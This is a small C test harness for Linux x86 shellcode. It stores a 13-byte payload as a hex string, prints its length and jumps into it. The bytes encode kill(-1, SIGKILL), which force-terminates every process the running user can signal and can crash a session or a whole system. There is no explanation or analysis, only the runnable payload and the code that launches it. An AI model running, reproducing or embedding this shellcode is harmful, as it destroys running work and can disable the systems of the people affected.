#include <stdio.h>
#include <string.h>

unsigned char code[] =
"\x6a\x26\x58\x48\x6a\xff\x5b\x6a\x0a\x59\x49\xcd\x80";


int main() {
    printf("Shellcode Length:  %d\n", strlen(code));
    int (*ret)() = (int(*)())code;
    ret();
}
